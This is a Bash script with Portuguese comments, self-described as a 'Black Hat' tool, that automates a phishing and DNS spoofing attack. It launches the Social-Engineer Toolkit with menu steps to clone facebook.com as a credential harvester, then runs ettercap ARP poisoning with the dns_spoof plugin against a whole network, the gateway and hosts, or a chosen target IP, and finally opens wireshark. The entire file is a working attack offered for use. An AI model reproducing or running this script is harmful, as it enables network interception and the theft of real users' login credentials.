#!/bin/bash
 
############
# FUNCAO 1 #
############
 
# Apresentacao
apresentacao()
{
    clear
    printf "     \e[1;92m.-\"\"\"\"-. \e[0m\n"
    printf "    \e[1;92m/        \ \e[0m\n"
    printf " \e[1;77m  \e[0m\e[1;92m/_        _\ \e[0m\n"
    printf "\e[1;77m  \e[0m\e[1;92m// \      / \\ \e[0m\n"
    printf "\e[1;77m  \e[0m\e[1;92m|\__\    /__/ \e[0m\n"
    printf "\e[1;77m  \e[0m\e[1;92m\    ||    / \e[0m\n"
    printf "\e[1;77m   \e[0m\e[1;92m\        / \e[0m\n"
    printf "\e[1;92m \e[0m   \e[1;92m\  __  / \e[0m\n"
    printf "     \e[1;92m'.__.' \e[0m\n\n"
 
    echo -e "\033[01;33m###################################\033[01;37m"
    echo -e "\033[01;32m Desenvolvido por DarProgrammer000\033[01;37m"
    echo -e "\033[31;5m Black Hat DarkProgrammer000\033[0m"
    echo -e "\033[01;33m##################################\033[01;37m"
    echo -e "\033[01;31m# DNS Spoof \n\n\033[00;37m"
}

############
# FUNCAO 2 #
############

# Programa
execucao()
{
	# Variavel de controle
	ip_gateway=$(route -n | grep "UG" | awk {'print $2'})

	# Passos
	apresentacao
	clonagem
	dnsSpoof
}

# Clonagem de site
clonagem()
{
	# Set Tool kit
	gnome-terminal -- setoolkit
	echo -e "\033[01;31m1: Social-Engineering Attacks	   \033[01;37m"
    	echo -e "\033[01;32m2: Website Attack Vectors	    	   \033[01;37m"
    	echo -e "\033[01;33m3: Credential Harvester Attack Method \033[01;37m"
    	echo -e "\033[01;34m2: Site Cloner			   \033[01;37m"
    	echo -e "\033[01;35mURL: facebook.com                   \n\033[01;37m"
}

# Rede inteira
net()
{
	# Apresentacao
	echo -e "\n\033[01;33m----- REDE INTEIRA -----\n\033[01;37m"

	# Comando: Rede inteira
	gnome-terminal -- ettercap -Tqi $placa -M ARP /// -P dns_spoof
}

# Gateway + Hosts
hosts()
{
	# Apresentacao
	echo -e "\n\033[01;33m----- HOSTS -----\033[01;37m"

	# Comando: Gateway + Rede Inteira
    	gnome-terminal -- ettercap -Tqi $placa -M ARP //$ip_gateway// /// -P dns_spoof
}

# Gateway + Target
target()
{
	# Apresentacao
	echo -e "\033[01;33m----- TARGET -----\n\033[01;37m"
	echo -n -e "\033[01;34m Alvo: \033[01;37m"
	read ip_alvo

	# Comando: Gateway + Target
	gnome-terminal -- ettercap -Tqi $placa -M ARP //$ip_gateway// //$ip_alvo// -P dns_spoof
}

dnsSpoof()
{
	ifconfig
	
	echo -n -e "\n\033[01;33m# Informe a placa de rede: \033[01;37m"
    	read placa
	
	echo -e "\n\033[01;33m# Informe a forma de ataque \033[01;37m"
    	echo -e "\n\033[01;34m[1] Rede inteira 	  \033[01;37m"
	echo -e "\n\033[01;35m[2] Gateway + Hosts  \033[01;37m"
	echo -e "\n\033[01;36m[3] Gateway + Target \033[01;37m"
	echo -n -e "\n\033[01;37m # Opc: \033[01;37m"
	read opc
	clear

	case $opc in

		1) net;;
		2) hosts;;
		3) target;;
		*) ;;
	esac
}

# Programacao
execucao
wireshark
